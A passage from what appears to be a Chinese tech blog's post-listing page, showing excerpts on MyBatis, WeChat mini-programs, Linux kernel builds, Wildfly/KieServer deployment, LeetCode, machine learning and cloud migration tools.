1、用注解来简化xml配置的时候，@Param注解的作用是给参数命名，参数命名后就能根据名字得到参数值，正确的将参数传入sql语句中。
2、简单说就是 @Param(“x2”) String x1 在启动时生成一个 x2 的属性，把参数 x1 的值赋给 x2，这样就可以在申请了中使用 #{x2} 或者 ${x2} 获取变量
3、如果不配置@Param(“x2”)，就不会有 x2 属性，只能用默认的 #{x1} 来取值。
现象二：Mapper.java传递参数与Mapper.xml使用参数不同 错误代码：
mapper.java
int batchUpdate(@Param("item") List&lt;T&gt; list); mapper.xml
&lt;update id="batchUpdate"&gt; &lt;foreach collection="list" index="index" item="item" open="" separator=";" close="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf8a4d5cd46935919e8202a29a18c244/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7259560525437e4254483a272da06579/" rel="bookmark">
			DropdownMenu 下拉菜单的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官方例子 ：Vant Weapp - 轻量、可靠的小程序 UI 组件库
官方的代码演示不够详细，这里记录一下，效果图
注意事件是写在&lt;van-dropdown-item&gt; 里，如： bind:opened="onOpenDropdown"
wxml：
&lt;view class=" custom-flex-row-start van-hairline--bottom"&gt; &lt;text&gt;仓库：&lt;/text&gt; &lt;van-dropdown-menu active-color="#4859E5" &gt; &lt;van-dropdown-item options="{{ option }}" title="{{menuText}}" title-class="color-blue" bind:opened="onOpenDropdown" bind:change="onChangeDropdown" /&gt; &lt;/van-dropdown-menu&gt; &lt;/view&gt; js:
const app = getApp() Page({ data: { menuText: '请选择', option: [ { text: 'aaa', value: 0 }, { text: 'bbbb', value: 1 }, { text: 'cccc', value: 2 }, ], }, //打开下拉菜单--获取仓库接口 onOpenDropdown(){ let url = "path" let data = { sessionKey: wx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7259560525437e4254483a272da06579/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d0cfc0b3174cb95c5b78fc7dcd010e0c/" rel="bookmark">
			Linux内核配置编译以及模块开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Linux内核简介Linux体系结构Linux内核架构虚拟文件系统内核源码结构Linux内核配置与编译为什么要配置内核？内核配置方法编译内核过程 Linux内核模块开发什么是内核模块内核模块设计安装与卸载模块可选信息模块申明模块参数符号导出 总结-对比应用编译问题**编译内核错误：Can't use 'defined(@array)' (Maybe you should just omit the defined()?) at kernel/timeconst.p...****linux/compiler-gcc9.h：没有那个文件或目录****编译内核出现：cc1: error: code model kernel does not support PIC mode**'make menuconfig' requires the ncurses libraries/bin/sh: 1: flex: not found/bin/sh: 1: bison: not foundfatal error: openssl/opensslv.h: 没有那个文件或目录make[1]: *** 没有规则可制作目标“debian/canonical-certs.pem” Linux内核简介 Linux体系结构 Linux由用户空间和内核空间组成
现代CPU通常实现了不同的工作模式，以ARM为例,实现了7种工作模式:
用户模式（ usr)、快速中断(fiq)、外部中断(irq)、管理模式( svc)、数据访问中止(abt)、系统模式(sys)、未定义指令异常(und)
X86也实现了4个不同的级别:Ring0-Ring3。Ring0下，可以执行特权指令，可以访问IO设备等，在Ring3则有很多限制。Linux系统利用了CPU的这一特性，使用了其中的两级来分别运行Linux内核与应用程序，这样使操作系统本身得到充分的保护。例如:如果使用X86，用户代码运行在Ring3，内核代码运行在Ring0。
内核空间与用户空间是程序执行的两种不同状态，通过系统调用和硬件中断能够完成从用户空间到内核空间的转移。
Linux内核架构 虚拟文件系统 VFS(虚拟文件系统)隐藏各种文件系统的具体细节，为文件操作提供统一的接口。
内核源码结构 arch目录
arch是architecture的缩写。内核所支持的每种CPU体系，在该目录下都有对应的子目录。每个CPU的子目录，又进一步分解为boot,mm,kernel等子目录，分别包含控制系统引导，内存管理，系统调用等。
documentation
内核的文档
drivers目录
设备驱动程序
include目录
内核所需要的头文件。与平台无关的头文件在include/linux子目录下面，与平台有关的头文件则放在对应的子目录中。
fs目录
存放各种文件系统的实现代码。每个子目录对应一种文件系统的实现，公用的源程序用于实现虚拟文件系统vfs.
net目录
网络协议的实现代码
Linux内核配置与编译 配置内核
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d0cfc0b3174cb95c5b78fc7dcd010e0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80721e00ac2011a2f05b58900eb0b6c0/" rel="bookmark">
			KieWorkbench&#43;KieServer&#43;Wildfly安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载 1. 下载business-central drools官网下载
curl https://download.jboss.org/drools/release/7.59.0.Final/business-central-7.59.0.Final-wildfly23.war --output ./business-central 2.wildfly下载 wildfly官方下载，24.0.1.Final
部署 cd /Users/woody/develop/wildfly-24.0.1.Final/standalone/deployments unzip ~/develop/business-central.war -d ./business-central.war touch business-central.war.dodeploy cd /home/wildfly/wildfly-14.0.1.Final/standalone/configuration vim application-roles.properties #增加如下配置 admin=admin analyst=analyst developer=developer manager=manager user=user vim application-users.properties #增加如下配置 #admin=admin admin=207b6e0cc556d7084b5e2db7d822555c #analyst=analyst analyst=047ca331957b5ce5021e8e01d3322a13 #developer=developer developer=97df44a197a58de9674af3cd139df47e #manager=manager manager=e5148a68341fbc5afbe08fb4ab6da2c5 #user=user user=c5568adea472163dfc00c19c6348a665 #最好先备份 vim standalone-full.xml #将management下ApplicationRealm配置修改为如下所示 &lt;security-realm name="ApplicationRealm"&gt; &lt;authentication&gt; &lt;local default-user="$local" allowed-users="*" skip-group-loading="true"/&gt; &lt;properties path="application-users.properties" relative-to="jboss.server.config.dir"/&gt; &lt;/authentication&gt; &lt;authorization&gt; &lt;properties path="application-roles.properties" relative-to="jboss.server.config.dir"/&gt; &lt;/authorization&gt; &lt;/security-realm&gt; 添加管理用户 /usr/local/wildfly8/bin 执行 ./add-user.sh ./add-user.sh Enter What type of user do you wish to add?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80721e00ac2011a2f05b58900eb0b6c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a0b823f7c365140cc0958b0d9910e08/" rel="bookmark">
			微信小程序二级联动 学校学院 picker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的需求是一级部门（学校或者学院）跟二级部门（学校或者学院的部门）的联动。
json的数据结构是：
[
[{id: "1", name: "部门00A"}, {id: "2", name: "部门00B"}],
[{id: "4", name: "保定学校", parentId: "1"}, {id: "5", name: "唐山学校", parentId: "1"},{id: "6", name: "石家庄学校", parentId: "1"},{id: "7", name: "湖北学校", parentId: "2"},{id: "8", name: "湖南学校", parentId: "2"},{id: "9", name: "海南学校", parentId: "2"}]
]
wxml代码：
&lt;view class="reg-item" wx:if="{{reg == false}}"&gt; &lt;picker mode="multiSelector" bindchange="bindMultiPickerChange" bindcolumnchange="bindMultiPickerColumnChange" value="{{multiIndex}}" range="{{multiArray}}" range-key="name"&gt; &lt;view wx:if="{{index == 0}}" class="reg-input-p reg-picker"&gt; 请选择所属部门 &lt;/view&gt; &lt;view wx:else class="reg-input reg-picker"&gt; {{multiArray[0][multiIndex[0]].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a0b823f7c365140cc0958b0d9910e08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe75246cdbedbee137c5b515f38adc51/" rel="bookmark">
			软件工程的经典书籍有哪些？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小编推荐几本软件工程方向的几本经典书。
1、解构领域驱动设计 本书全面阐释了领域驱动设计（domain-driven design，DDD）的知识体系，内容覆盖领域驱动设计的主要模式与主流方法，并在此基础上提出“领域驱动设计统一过程”（domain-driven design unified process，DDDUP），将整个软件构建过程划分为全局分析、架构映射和领域建模3个阶段。除给出诸多案例来阐释领域驱动设计统一过程中的方法与模式之外，本书还通过一个真实而完整的案例全面展现了如何进行领域驱动设计统一过程的实施和落地。为了更好地运用领域驱动设计统一过程，本书还开创性地引入了业务服务、菱形对称架构、领域驱动架构、服务驱动设计等方法与模式，总结了领域驱动设计能力评估模型与参考过程模型。本书提出的一整套方法体系已在多个项目中推广和落地。
本书适合希望领会软件架构本质、提高软件架构能力的软件架构师，希望提高领域建模能力、打磨软件设计能力的开发人员，希望掌握业务分析与建模方法的业务分析人员，希望学习领域驱动设计并将其运用到项目中的软件行业从业人员阅读参考。
2、代码整洁之道 软件质量，不但依赖架构及项目管理，而且与代码质量紧密相关。这一点，无论是敏捷开发流派还是传统开发流派，都不得不承认。
本书提出一种观点：代码质量与其整洁度成正比。干净的代码，既在质量上较为可靠，也为后期维护、升级奠定了良好基础。作为编程领域的佼佼者，本书作者给出了一系列行之有效的整洁代码操作实践。这些实践在本书中体现为一条条规则（或称“启示”），并辅以来自实际项目的正、反两面的范例。只要遵循这些规则，就能编写出干净的代码，从而有效提升代码质量。
本书阅读对象为一切有志于改善代码质量的程序员及技术经理。书中介绍的规则均来自作者多年的实践经验，涵盖从命名到重构的多个编程方面，虽为一“家”之言，然诚有可资借鉴的价值。
3、重构 改善既有代码的设计（第2版 平装版） 本书是经典著作《重构》出版20年后的更新版。书中清晰揭示了重构的过程，解释了重构的原理和实践方式，并给出了何时以及何地应该开始挖掘代码以求改善。书中给出了60多个可行的重构，每个重构都介绍了一种经过验证的代码变换手法的动机和技术。本书提出的重构准则将帮助开发人员一次一小步地修改代码，从而减少了开发过程中的风险。
本书适合软件开发人员、项目管理人员等阅读，也可作为高等院校计算机及相关专业师生的参考读物。
4、敏捷整洁之道：回归本源
敏捷虽然是一种帮助小团队运作小项目的小方法，但它对整个IT 行业有着巨大的影响，因为任何大项目都是由若干小项目组成的。他将自己50年的从业经验融入平实的文字，展示了敏捷如何帮助软件行业从业者达到真正的专业水准。
书中的具体内容包括：
● 回归本源——敏捷从哪里来，现状如何，应该坚守的底线是什么；
● 理解Scrum 的来源和正确用法；
● 掌握敏捷业务实践的精髓，从小步发布、验收测试，到完整团队的沟通；
● 探寻敏捷团队中人与人之间、人与产品之间的关系；
● 重拾不可或缺的敏捷技术实践，包括测试驱动开发、重构、简单设计、结对编程；
● 理解敏捷价值观与匠艺精神在敏捷团队中的重要意义。
如果想从敏捷中获益，没有捷径可走：必须把敏捷用对。不管你是开发人员、测试人员、管理人员、项目经理还是客户，本书都会告诉你如何把敏捷用对。
5、代码整洁之道：程序员的职业素养 软件开发大师Robert C. Martin在书中介绍了真实软件技艺中的各项原则、技术、工具和实践，展示了怎么以自豪、自尊和自信的心态进行软件开发，怎么取得卓越表现和丰硕成果，怎么做到有效沟通和确切估算，怎么以坦诚的心态面对困难，并引导读者认识到专业程序员肩负的责任重大，阐述了什么才是程序员的职业素养。
书中的具体内容包括：
● 成为真正的软件专业人士需要具备哪些条件，如何应对彼此冲突又紧张的进度表和不近情理的管理人员；
● 如何做到流畅编程，克服阻塞状态；
● 如何应对无休止的工作压力，避免崩溃；
● 如何培养坚持不懈的态度，如何拥抱新的开发范式；
● 如何管理好时间，避免身陷泥潭无法自拔；
● 如何培育有利于程序员和开发团队茁壮成长的环境；
● 什么时候应该说“不”，怎么说；
● 什么时候应该说“是”，承诺意味着什么。
软件强大、优雅而实用，让人惊叹不已，不论是开发者还是用户都乐于使用这样的软件。它们并非是由机器编写出来的，而是出自那些对软件技艺拥有坚定信念的专业软件开发者之手。本书将帮助读者成为专业软件开发者中的一员，并赢得只有他们才能拥有的荣誉感和成就感。
6、领域驱动设计：软件核心复杂性应对之道（修订版） 领域模型使开发人员可以表达丰富的软件功能需求，由此实现的软件可以满足用户真正的需要，因此被公认为是软件设计的关键所在，其重要性显而易见。但讲述如何将领域模型用于软件开发过程的杰出的实用资料却不多见。本书正是这一领域声名显赫的作品，受到众多业界大师的赞美和推介，广受读者好评。
要通过创建领域模型来加速复杂的软件开发，就需要利用大量实践和标准模式在开发团队中形成统一的交流语言；不但要重构代码，而且要重构代码底层的模型；同时采取反复迭代的敏捷开发方法，深入理解领域特点，促进领域专家与程序员的良好沟通。针对这些内容，本书结合真实项目，系统地介绍了领域驱动开发的目标、意义和方法，充分讨论了复杂系统的建模与设计问题。
本书将指导面向对象开发人员、系统分析人员和设计人员合理地组织工作，各有侧重、彼此协作，有条不紊地进行复杂系统的开发，帮助他们建立丰富而实用的领域模型，并由此创建长期适用的优质软件。
7、软件工程（第4版•修订版） 本书是软件工程领域公认的经典名著，也是业界常引用的主要文献之一，被国内外众多名校广泛采用。与其他软件工程著作不同，本书注重从实践出发选择和安排素材，同时又从理论上进行了全面深入的探讨。对诸如复用、风险管理和质量工程、测度和度量等理论性比较强的主题，没有专设章节，而是融合在相关的各种软件工程活动中讲述。
本书理论阐述循序渐进，善于揭示各知识点之间的内在联系，并通过大量实例和工程实践深化和丰富理论知识；选材与时俱进，反映了业界动态，尤其是建模和敏捷方法方面的重要进展。两个贯穿全书的研究案例——信息系统案例和实时系统案例，以及书中的学期项目，引导读者很好地将概念有机地应用到实际项目中去。
8、构建之法——现代软件工程（第三版） 软件工程牵涉的范围很广， 同时也是一般院校的同学反映比较空洞乏味的课程。 但是软件工程的技术对于投身IT 产业的学生来说是非常重要的。作者邹欣有长达20年的一线软件开发经验，他利用业余时间在数所高校进行了长达6年的软件工程教学实践，总结出了在16周的时间内让同学们通过 “做中学 (Learning By Doing)” 掌握实用的软件工程技术的教学计划，并得到高校师生的积极反馈。在此基础上，作者对软件工程的各个知识点和技能要求进行了系统性整理，形成教材。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe75246cdbedbee137c5b515f38adc51/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f0f379aaa5d4c5aed2a1422f3386f3a/" rel="bookmark">
			机器学习-day1
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@day1 人工智能阶段 机器学习 三天 深度学习 三天 量化交易 四天 传统的机器学习算法 机器学习概述、特征工程 1天 分类算法 1天`` 回归算法、聚类 1天 机器学习概述 1.1 人工智能概述 达特茅斯会议-人工智能的起点 机器学习是人工智能的一个实现途径 深度学习是机器学习的一个方法发展而来 1.1.2 机器学习、深度学习能做些什么 传统预测 图像识别 自然语言处理 1.2 什么是机器学习 数据 模型 预测 从历史数据当中获得规律？这些历史数据是怎么的格式？ 1.2.3 数据集构成 特征值 + 目标值 1.3 机器学习算法分类 监督学习 目标值：类别 - 分类问题 k-近邻算法、贝叶斯分类、决策树与随机森林、逻辑回归 目标值：连续型的数据 - 回归问题 线性回归、岭回归 目标值：无 - 无监督学习 聚类 k-means 1、预测明天的气温是多少度？ 回归 2、预测明天是阴、晴还是雨？ 分类 3、人脸年龄预测？ 回归/分类 4、人脸识别？ 分类 1.4 机器学习开发流程 1）获取数据 2）数据处理 3）特征工程 4）机器学习算法训练 - 模型 5）模型评估 6）应用 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0f0f379aaa5d4c5aed2a1422f3386f3a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02c9eee7f63bf5c6a9899616cd16e252/" rel="bookmark">
			The given artifact contains a string literal with a package reference ‘android.support.v4.content‘ t
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		android.support.v4.content 切换到 androidx
编译报错：
The given artifact contains a string literal with a package reference 'android.support.v4.content' that cannot be safely rewritten. Libraries using reflection such as annotation processors need to be updated manually to add support for androidx. 原本：
implementation 'com.jakewharton:butterknife:8.8.1' annotationProcessor 'com.jakewharton:butterknife-compiler:8.8.1' 替换成：
implementation 'com.jakewharton:butterknife:10.2.1' annotationProcessor 'com.jakewharton:butterknife-compiler:10.2.1' 如下例子：
子Module添加butterknife依赖：
implementation 'com.jakewharton:butterknife:10.2.1' 主Module添加butterknife注解处理器依赖： annotationProcessor 'com.jakewharton:butterknife-compiler:10.2.1' project的gradle文件
dependencies { classpath "com.android.tools.build:gradle:4.0.0" classpath 'com.jakewharton:butterknife-gradle-plugin:10.2.1' // NOTE: Do not place your application dependencies here; they belong // in the individual module build.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02c9eee7f63bf5c6a9899616cd16e252/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a381d8825a588f1c7a10f0c0d784e801/" rel="bookmark">
			【数据分享】全国地铁站点及其地铁线路数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文中向大家分享一下全国各地区的地铁站点数据以及地铁线路的数据。所有数据已经制作完毕，但目前暂不清楚数据的具体时间，各数据已经按照不同城市进行划分，每个城市内包含所有的地铁站点以及地铁线路数据。数据的具体情况如下图所示：
1.全国地铁数据
2.部分城市数据展示
（1）北京数据展示：数据中共18条线路。
（2）天津数据展示：数据中存在14条线路。
（3）
青岛数据展示：数据中存在10条线路。
（4）武汉数据展示：数据中存在14条线路。
（5）杭州数据展示：数据中存在16条线路
数据已经上传云盘，公主号【生态与遥感应用】后台回复关键字0919即可免费获取。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f69e3db6d41d57fb74ad5d363ea094ad/" rel="bookmark">
			Leetcode 155. 最小栈 (每日一题 20210923)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		设计一个支持 push ，pop ，top 操作，并能在常数时间内检索到最小元素的栈。 push(x) —— 将元素 x 推入栈中。 pop() —— 删除栈顶的元素。 top() —— 获取栈顶元素。 getMin() —— 检索栈中的最小元素。 示例: 输入： ["MinStack","push","push","push","getMin","pop","top","getMin"] [[],[-2],[0],[-3],[],[],[],[]] 输出： [null,null,null,null,-3,null,0,-2] 解释： MinStack minStack = new MinStack(); minStack.push(-2); minStack.push(0); minStack.push(-3); minStack.getMin(); --&gt; 返回 -3. minStack.pop(); minStack.top(); --&gt; 返回 0. minStack.getMin(); --&gt; 返回 -2. 链接：https://leetcode-cn.com/problems/min-stack class MinStack: def __init__(self): """ initialize your data structure here. """ self.A = [] def push(self, val: int) -&gt; None: if not self.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f69e3db6d41d57fb74ad5d363ea094ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4afceaf80f7e934a366741cd5b381e74/" rel="bookmark">
			server 2016备份还原
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		j'qjq在环境布置完成情况下安装一个
新建一个磁盘
新建一个用户 进行备份命令行输入
删除用户yu
也可以进行自动备份
backuP_sysstate.bat文件 进入安全模式
CTRL+c中段
输入ntdsuil在输入activate instance ntds 输入authoritative restore输入 restore object cn=yu，dc=com
提出安全模式
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e04b54cba79e4da232ed05853bc4c5f/" rel="bookmark">
			简要说明人工智能专业以及就业前景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		培养掌握人工智能基础专业理论知识、应用技术，具备人工智能技术应用开发、系统管理与维护等能力，从事人工智能相关的应用开发、系统集成与运维、产品销售与咨询、售前售后技术支持等工作的高素质技术技能人才。
就业前景
第一：智能化是未来的重要趋势之一。随着互联网的发展，大数据、云计算和物联网等相关技术会陆续普及应用，在这个大背景下，智能化必然是发展趋势之一。人工智能相关技术将首先在互联网行业开始应用，然后陆续普及到其他行业。所以，从大的发展前景来看，人工智能相关领域的发展前景还是非常广阔的。
第二：产业互联网的发展必然会带动人工智能的发展。互联网当前正在从消费互联网向产业互联网发展，产业互联网将综合应用物联网、大数据和人工智能等相关技术来赋能广大传统行业，人工智能作为重要的技术之一，必然会在产业互联网发展的过程中释放出大量的就业岗位。
第三：人工智能技术将成为职场人的必备技能之一。随着智能体逐渐走进生产环境，未来职场人在工作过程中将会频繁的与大量的智能体进行交流和合作，这对于职场人提出了新的要求，就是需要掌握人工智能的相关技术。从这个角度来看，未来掌握人工智能技术将成为一个必然的趋势，相关技能的教育市场也会迎来巨大的发展机会。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca06cbbdc29178de15c1a56662cb2a62/" rel="bookmark">
			静态方法和动态方法的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.静态的方法在整个应用程序其间存储在内存中，速度快，但占用内存.。
class A { public static string a() { return "Hello"; } } A.a(); //调用方便 2.动态的方法在先声明类实例才能调用类中的方法.
class A { public string a() { return "Hello"; } } A b = new A(); b.a(); 3.一般使用频繁的方法用静态方法，用的少的方法用动态的。静态的速度快，占内存。动态的速度相对慢些，但调用完后，立即释放类，可以节省内存，可以根据自己的需要选择是用动态方法还是静态方法。
4.静态方法主要的问题就是数据同步的问题。如果你的静态方法的类中不保存私有变量那么什么问题都不会有的。最好是包要操作的数据全部以参数的方式传到方法中去
5. 静态方法是类方法，调用时不需要创建类实例。
6. 静态方法是静态绑定到子类，不是被继承。
7.从面向对象的角度来看:
静态方法面向的是类的操作,而实例方法面向的是对象。
8.静态方法修改的是类的状态,而对象修改的是各个对象的状态,这点也是它们重要的区别。
9.类的实例化调用是在类的生命周期中存在，当类没有了以后，对应的实例也就没有了，对应的方法也就没有了，静态类不然，只要你引用了那个静态类的命名空间，他就会一直存在，知道你退出系统。**
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4e160707ee909180d32c0a7024d4019/" rel="bookmark">
			机器学习（18）-- SVM支持向量机（根据身高体重分类性别）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、基础理论
二、身高体重预测性别
1、获取数据（男女生身高体重）
2、数据处理（合并数据）
3、设置标签
4、创建分类器（支持向量机）
4-1、创建svm分类器
4-2、设置分类器属性（线性核）
5、训练
6、预测
总代码
一、基础理论 SVM本质：寻求一个最优的超平面进行分类。（分类器）
SVM核：支持很多核（这里主要使用线性核）
左图分类比较简单，一条线就可以分类；
但右图一条线明显无法完成分类，这时则需要多条线甚至曲线才能完成分类。
这里用的是监督学习，所以必须要有label标签（即目标值）。
二、身高体重预测性别 1、获取数据（男女生身高体重） 获取男女生身高体重（训练集、测试集） # 训练集 girls_train = np.array([[155, 48], [159, 50], [165, 55], [158, 55], [170, 58]]) boys_train = np.array([[162, 56], [182, 68], [175, 62], [180, 72], [178, 66]]) # 测试集 girls_test = np.array([[152,46], [164,55]]) boys_test = np.array([[175,64], [182, 67]]) 2、数据处理（合并数据） # 2 合并数据（并转浮点型，svm需要） data = np.vstack((girls_train, boys_train)) data = np.array(data, dtype='float32') print(data) predict_data = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4e160707ee909180d32c0a7024d4019/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bf308012bf89dd56cb75499c9a8f7803/" rel="bookmark">
			Image edge mobile 存储器没有足够的储存空间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		检查
1、手机内存足够（约30G）
2、iclould内存充足（约10G），因为我的相册是iCloud同步的，相机导入会自动同步，当时出现这个提示的时候，检查了一下iCloud空间。
尝试1 重装软件，❌仍然提示该信息。 尝试2 尝试了ipad❌ 疑惑是不是设备，仍然报错
尝试3 安卓系统🉑️ 找了个安卓手机，下载了Image edge mobile，注：华为不要在软件商城里下载，是假的广告软件。直接去索尼官网点击链接下载安装。
尝试传输12min的视频，前期传了两回总是在传输中间中断，显示无法获取影像，感觉好像是因为wifi连接不稳定的原因。我是通过扫QR码，无线传输的。
第三回尝试传输，再次中断，后再尝试显示和iPhone相同的问题，存储器没有足够储存空间。这时候发现它说的空间可能不单指内部存储，可能和系统操作内存也有关。
说操作：用自带的系统管家清理一下缓存。
然后再次传输，不报错，且没中断。算是传完了一个（战战兢兢）。还有传输格式，2M传输中断，就换另一个，试着来。
结论：换安卓是可以，但是也是不稳定。入手了个读卡器，后续再试试再补充。
2021/9/22
读卡器 读卡器到了，随插随用，买的绿联的，目前没啥问题。
不过视频大小手机传输4g，电脑上显示900m，不知道什么原因，是否有画质损失之类的，想入的可以看看评论或说明书再确认一下
2021/9/26
Ps：问了索尼的在线客服这些问题，没有什么建设性意见，一直让换个设备换个系统再试试…手机 pad mac 都不行，让再换个电脑（？？？）
问了是不是可能是软件不支持大视频传输，也没啥确定性回复。给的建议是可以拍摄视频短点（？？？），唉。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0088ffad97beb5b48b79ba9e1f500fab/" rel="bookmark">
			力扣（LeetCode）-两数相加算法（JavaScript三种实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 的那 两个 整数，并返回它们的数组下标。
你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。
你可以按任意顺序返回答案。
示例 1：
输入：nums = [2,7,11,15], target = 9 输出：[0,1] 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。 示例 2：
输入：nums = [3,2,4], target = 6 输出：[1,2] 示例 3：
输入：nums = [3,3], target = 6 输出：[0,1] 提示：
2 &lt;= nums.length &lt;= 10^3
-10^9 &lt;= nums[i] &lt;= 10^9
-10^9 &lt;= target &lt;= 10^9
只会存在一个有效答案
1.暴力法
使用两层循环，外层循环计算当前元素与 target 之间的差值，内层循环寻找该差值，若找到该差值，则返回两个元素的下标。 时间复杂度：O(n^2)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0088ffad97beb5b48b79ba9e1f500fab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c7088883032164deb5c5fe19c4100cd/" rel="bookmark">
			云迁移常见工具介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 专业化的迁移工具，包括云迁移分析工具，主机迁移工具，NAS存储迁移工具，对象存储迁移工具，数据库迁移工具。
1、标准化迁移分析工具
用于评估数据库和应用迁移上云的工具类产品，可显著地降低上云的技术难度和成本，尤其是Oracle数据库应用。云迁移分析工具会全面评估上云可行性、成本和云存储选型，内置实施协助，数据、应用迁移等工具，确保可靠、快速上云。
2、标准化主机迁移工具
基于字节级复制技术，能够实现主流Windows和Linux操作系统的上云迁移。能够在不停机的情况下，实现x86物理主机、虚拟机、云主机到任意x86平台的系统迁移。
由于采用的是基于操作系统层面的复制和迁移，迁移工具具有一定的应用无关性，能够支持绝大多数单机或单实例应用。包括应用服务器、数据库服务器和文件服务器等。工具支持所有主流的x86操作系统。并且与实际的硬件基础架构无关。是实现主机系统迁移上移动云最佳的迁移工具，相关的方案也是最佳的方案。
3、标准化NAS迁移工具
专业的NAS存储数据复制和迁移软件，能够实现源端NAS存储到目标端NAS存储之间的准实时数据同步。并且当源端和目标端NAS存储的状态达到同步时，无需立刻进行系统割接操作，可以按照实际情况选择合适的系统割接窗口进行系统割接。在系统割接之前，迁移工具将时刻保持源端NAS存储与目标端NAS存储的状态同步。
4、标准化对象存储迁移工具
由于对象存储采用的是Restful API的方式来实现访问，并且是一个分布式的存储系统，因此，不能用传统的文件系统层面的数据复制来完成对象存储的数据迁移工作。
对象存储迁移工具同步迁移方案通过专门的同步主机，捕捉源端数据的变化，并通过Restful API写入到目标端对象存储中，从而实现源端系统到对象存储系统数据同步。源端系统包括本地文件系统、NAS存储以及对象存储。对端包括兼容S3协议的所有对象存储。
5、标准化数据库迁移工具
基本功能 支持生产端数据库在归档和非归档模式下的数据复制；复制时不影响源库与备库的正常运行全同步及增量同步操作和衔接增量数据，全自动完成，不影响业务数据库复制支持源端和目标端的事务级最终一致性数据库复制支持数据库的分布式事务场景下的数据复制支持一对多复制,一对一、多对一、级联数据库复制支持不同字符集的数据库之间的同步，UTF8-&gt;ZHGBK，ZHGBK-&gt;UTF8等选择性复制能力 全面支持整库、Schema级别、表级别的复制基于主键和ROWID两种映射方式,不依赖于主键、不修改生产线系统源端表支持针对源表的部分字段复制，以及源表和备端表不同列名之间的列映射复制支持针对全量同步对象过滤设置,不限于索引、视图、函数、触发器等支持增量同步DDL的选择性复制, 过滤设置不限于表、分区表、索引、授权、物化视图、表空间等DDL操作允许用户名不相同的源库与备份库复制，可针对特定用户或特定的表做选择性复制支持源端删除行数据，备端转化成该行打上删除标记的功能。自有的数据库复制 DDL/DML一体化实时同步、无任何限制生产端数据库添加表，删除表时能够进行自动同步到备份端数据库。允许在不停业务的情况下对数据库进行全同步及增量复制，无需其他方式处理初始数据满足容灾场景下，WEB界面化的一键备机接管功能，完成备库接管业务前的准备工作并行复制 同一源端下多个复制进行互不影响，可独立进行相关启停等运维操作支持多种数据库 包括MySQL，Oracle，SQL Server，PostgreSQL 等。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
